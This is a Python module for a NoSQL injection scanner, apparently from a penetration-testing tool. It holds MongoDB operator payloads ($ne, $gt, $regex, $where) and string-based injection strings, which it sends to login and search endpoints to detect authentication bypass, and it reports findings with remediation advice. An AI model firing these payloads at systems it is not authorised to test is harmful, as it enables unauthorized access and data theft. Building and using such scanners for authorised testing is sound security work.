"""
NoSQL Injection Scanner
Tests for MongoDB and other NoSQL injection vulnerabilities
"""

import json
import hashlib
import asyncio
from typing import List, Optional, Dict, Any
from urllib.parse import urlencode
import logging

from app.models.scan import Vulnerability, SeverityLevel, VulnerabilityCategory
from app.http.client import PentestHTTPClient

logger = logging.getLogger(__name__)


class NoSQLInjectionScanner:
    """Scanner for NoSQL injection vulnerabilities (MongoDB, CouchDB, etc.)"""

    # MongoDB operator injection payloads
    MONGODB_PAYLOADS = [
        # Authentication bypass
        {"$ne": None},
        {"$ne": ""},
        {"$ne": 0},
        {"$ne": -1},
        {"$gt": ""},
        {"$gt": 0},
        {"$gte": ""},
        {"$lt": ""},
        {"$regex": ".*"},
        {"$regex": "^.*"},

        # Boolean-based
        {"$or": [{"a": "a"}, {"a": "a"}]},
        {"$and": [{"a": "a"}, {"a": "a"}]},
        {"$where": "1==1"},
        {"$where": "this.password != null"},

        # Injection in arrays
        {"$in": ["admin", "administrator", "root"]},
        {"$nin": []},

        # Special operators
        {"$exists": True},
        {"$type": 2},  # String type
    ]

    # JSON payloads for testing
    JSON_INJECTION_PAYLOADS = [
        '{"$ne": null}',
        '{"$ne": ""}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        '{"$or": [{"a":"a"}, {"a":"a"}]}',
    ]

    # String-based NoSQL injection attempts
    STRING_PAYLOADS = [
        "' || '1'=='1",
        "' || 1==1//",
        "' || 1==1%00",
        "admin'||'1==1",
        "admin' || '1'=='1",
        '{"$gt": ""}',
        '{$gt: ""}',
    ]

    def __init__(self, client: PentestHTTPClient, scan_depth: str = "balanced", progress_callback=None):
        self.client = client
        self.scan_depth = scan_depth
        self.progress_callback = progress_callback

        # Adjust payload limits based on depth
        if scan_depth == "quick":
            self.mongodb_limit = 6
            self.json_limit = 3
            self.string_limit = 3
        elif scan_depth == "balanced":
            self.mongodb_limit = 12
            self.json_limit = 6
            self.string_limit = 5
        else:  # deep
            self.mongodb_limit = len(self.MONGODB_PAYLOADS)
            self.json_limit = len(self.JSON_INJECTION_PAYLOADS)
            self.string_limit = len(self.STRING_PAYLOADS)

    async def scan(self, endpoints: List[str]) -> List[Vulnerability]:
        """Scan for NoSQL injection vulnerabilities"""
        vulnerabilities = []
        total_endpoints = len(endpoints)

        if self.progress_callback:
            await self.progress_callback(f"🗄️  Starting NoSQL Injection Testing on {total_endpoints} endpoints...")

        for idx, endpoint in enumerate(endpoints, 1):
            if self.progress_callback:
                await self.progress_callback(f"🔍 Testing NoSQL on endpoint {idx}/{total_endpoints}: {endpoint[:60]}...")

            try:
                # Test JSON-based injection (most common for APIs)
                vulns = await self._test_json_injection(endpoint)
                vulnerabilities.extend(vulns)

                # Test query parameter injection
                if '?' in endpoint or any(keyword in endpoint.lower() for keyword in ['login', 'auth', 'user', 'search']):
                    vulns = await self._test_param_injection(endpoint)
                    vulnerabilities.extend(vulns)

                # Test POST body injection
                vulns = await self._test_post_injection(endpoint)
                vulnerabilities.extend(vulns)

                if vulns and self.progress_callback:
                    await self.progress_callback(f"✅ Found {len(vulns)} NoSQL injection vulnerability(ies) on {endpoint[:60]}")

            except Exception as e:
                logger.error(f"Error testing NoSQL injection on {endpoint}: {e}")
                if self.progress_callback:
                    await self.progress_callback(f"⚠️  Error testing NoSQL on {endpoint[:60]}: {str(e)[:50]}")

        return vulnerabilities

    async def _test_json_injection(self, endpoint: str) -> List[Vulnerability]:
        """Test for NoSQL injection via JSON payloads"""
        vulnerabilities = []

        try:
            # Get baseline response with normal data
            baseline_data = {"username": "nonexistentuser123", "password": "wrongpassword123"}
            baseline_response = await self.client.post(endpoint, json=baseline_data)
            baseline_status = baseline_response.status_code if hasattr(baseline_response, 'status_code') else 0

            # Test MongoDB operator payloads
            for payload_dict in self.MONGODB_PAYLOADS[:self.mongodb_limit]:
                # Test in username field
                test_data = {"username": payload_dict, "password": "test"}
                response = await self.client.post(endpoint, json=test_data)

                if await self._is_successful_injection(response, baseline_response, baseline_status):
                    vulnerabilities.append(self._create_vulnerability(
                        endpoint=endpoint,
                        payload=json.dumps(test_data),
                        injection_point="JSON Body - username field",
                        description=f"NoSQL injection successful using MongoDB operator {list(payload_dict.keys())[0]}. The application accepted the malicious operator and likely bypassed authentication or data filtering.",
                        poc=f"Injected payload: {json.dumps(test_data)}. Response status changed from {baseline_status} to {response.status_code if hasattr(response, 'status_code') else 'N/A'}, indicating successful injection."
                    ))
                    logger.warning(f"NoSQL injection found on {endpoint} with payload: {payload_dict}")
                    break  # Found vulnerability, no need to test more

                # Test in password field
                test_data = {"username": "admin", "password": payload_dict}
                response = await self.client.post(endpoint, json=test_data)

                if await self._is_successful_injection(response, baseline_response, baseline_status):
                    vulnerabilities.append(self._create_vulnerability(
                        endpoint=endpoint,
                        payload=json.dumps(test_data),
                        injection_point="JSON Body - password field",
                        description=f"NoSQL injection successful using MongoDB operator {list(payload_dict.keys())[0]} in password field.",
                        poc=f"Injected payload: {json.dumps(test_data)}. Successfully bypassed authentication."
                    ))
                    logger.warning(f"NoSQL injection found on {endpoint} in password field")
                    break

        except Exception as e:
            logger.debug(f"JSON injection test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _test_param_injection(self, endpoint: str) -> List[Vulnerability]:
        """Test for NoSQL injection via query parameters"""
        vulnerabilities = []

        try:
            # Parse URL to extract parameters
            if '?' in endpoint:
                base_url, query_string = endpoint.split('?', 1)
                params = dict([p.split('=') for p in query_string.split('&') if '=' in p])
            else:
                # Try common parameters
                base_url = endpoint
                params = {"user": "test", "id": "1", "search": "test"}

            # Get baseline response
            baseline_response = await self.client.get(base_url, params=params)
            baseline_status = baseline_response.status_code if hasattr(baseline_response, 'status_code') else 0

            # Test each parameter
            for param_name, original_value in list(params.items())[:3]:  # Test first 3 params
                # Test with JSON string operators
                for json_payload in self.JSON_INJECTION_PAYLOADS[:self.json_limit]:
                    test_params = params.copy()
                    test_params[param_name] = json_payload

                    response = await self.client.get(base_url, params=test_params)

                    if await self._is_successful_injection(response, baseline_response, baseline_status):
                        vulnerabilities.append(self._create_vulnerability(
                            endpoint=endpoint,
                            payload=f"{param_name}={json_payload}",
                            injection_point=f"Query Parameter - {param_name}",
                            description=f"NoSQL injection successful in query parameter '{param_name}' using MongoDB operator.",
                            poc=f"Modified parameter '{param_name}' from '{original_value}' to '{json_payload}'. Server processed the NoSQL operator."
                        ))
                        logger.warning(f"NoSQL injection found in parameter {param_name} on {endpoint}")
                        break

                # Test with string-based payloads
                for string_payload in self.STRING_PAYLOADS[:self.string_limit]:
                    test_params = params.copy()
                    test_params[param_name] = string_payload

                    response = await self.client.get(base_url, params=test_params)

                    if await self._is_successful_injection(response, baseline_response, baseline_status):
                        vulnerabilities.append(self._create_vulnerability(
                            endpoint=endpoint,
                            payload=f"{param_name}={string_payload}",
                            injection_point=f"Query Parameter - {param_name}",
                            description=f"NoSQL injection successful using string-based payload in parameter '{param_name}'.",
                            poc=f"Payload '{string_payload}' in parameter '{param_name}' altered application behavior."
                        ))
                        logger.warning(f"NoSQL string injection found in {param_name} on {endpoint}")
                        break

        except Exception as e:
            logger.debug(f"Parameter injection test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _test_post_injection(self, endpoint: str) -> List[Vulnerability]:
        """Test for NoSQL injection in POST body with various content types"""
        vulnerabilities = []

        try:
            # Test with application/x-www-form-urlencoded
            baseline_data = {"username": "testuser", "password": "testpass"}
            baseline_response = await self.client.post(endpoint, data=baseline_data)
            baseline_status = baseline_response.status_code if hasattr(baseline_response, 'status_code') else 0

            # Test form data with MongoDB operators (as strings)
            for json_string in self.JSON_INJECTION_PAYLOADS[:self.json_limit]:
                test_data = {"username": json_string, "password": "test"}
                response = await self.client.post(endpoint, data=test_data)

                if await self._is_successful_injection(response, baseline_response, baseline_status):
                    vulnerabilities.append(self._create_vulnerability(
                        endpoint=endpoint,
                        payload=f"username={json_string}",
                        injection_point="POST Form Data - username",
                        description="NoSQL injection successful in form-encoded POST data.",
                        poc=f"Submitted form data with MongoDB operator as string: {json_string}"
                    ))
                    logger.warning(f"NoSQL injection in POST form data on {endpoint}")
                    break

        except Exception as e:
            logger.debug(f"POST injection test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _is_successful_injection(self, response: Any, baseline_response: Any, baseline_status: int) -> bool:
        """Determine if injection was successful based on response differences"""
        if not response:
            return False

        try:
            current_status = response.status_code if hasattr(response, 'status_code') else 0

            # Success indicators:
            # 1. Status code changed from 401/403 to 200/302 (auth bypass)
            if baseline_status in [401, 403, 404] and current_status in [200, 201, 302]:
                return True

            # 2. Status code changed from 4xx to 2xx
            if 400 <= baseline_status < 500 and 200 <= current_status < 300:
                return True

            # 3. Response contains success indicators
            if hasattr(response, 'text'):
                response_text = response.text.lower()
                success_indicators = ['success', 'welcome', 'dashboard', 'token', 'session', 'authenticated', 'logged in']
                error_indicators = ['invalid', 'error', 'failed', 'incorrect', 'wrong']

                # If baseline had errors but injection response has success
                baseline_text = baseline_response.text.lower() if hasattr(baseline_response, 'text') else ''
                baseline_has_error = any(err in baseline_text for err in error_indicators)
                response_has_success = any(suc in response_text for suc in success_indicators)

                if baseline_has_error and response_has_success:
                    return True

            # 4. Response size significantly different (potential data leak)
            if hasattr(response, 'content') and hasattr(baseline_response, 'content'):
                response_size = len(response.content)
                baseline_size = len(baseline_response.content)

                # If response is significantly larger (more than 2x), might indicate data leak
                if response_size > baseline_size * 2 and response_size > 500:
                    return True

        except Exception as e:
            logger.debug(f"Error comparing responses: {e}")

        return False

    def _create_vulnerability(self, endpoint: str, payload: str, injection_point: str,
                            description: str, poc: str) -> Vulnerability:
        """Create a vulnerability object for NoSQL injection"""
        return Vulnerability(
            id=f"nosql_injection_{hashlib.md5((endpoint + payload).encode()).hexdigest()[:8]}",
            title=f"NoSQL Injection Vulnerability - {injection_point}",
            description=description,
            severity=SeverityLevel.CRITICAL,
            category=VulnerabilityCategory.INJECTION,
            affected_url=endpoint,
            affected_parameter=injection_point,
            proof_of_concept=poc,
            payload=payload,
            remediation="""
            1. Use parameterized queries and ODM/ORM libraries that prevent operator injection
            2. Validate and sanitize all user input - reject objects/arrays where strings are expected
            3. Use allow-lists for acceptable input values
            4. Never construct queries by string concatenation
            5. Implement proper input type checking (reject MongoDB operators like $ne, $gt, etc. in user input)
            6. Use role-based access control (RBAC) to limit database permissions
            7. Enable MongoDB's security features and keep it updated
            8. For Node.js/MongoDB: Use mongo-sanitize library or similar
            """,
            cwe_id="CWE-943",
            owasp_category="A03:2021 – Injection",
            references=[
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                "https://github.com/Charlie-belmer/nosqli",
                "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html",
                "https://book.hacktricks.xyz/pentesting-web/nosql-injection"
            ]
        )
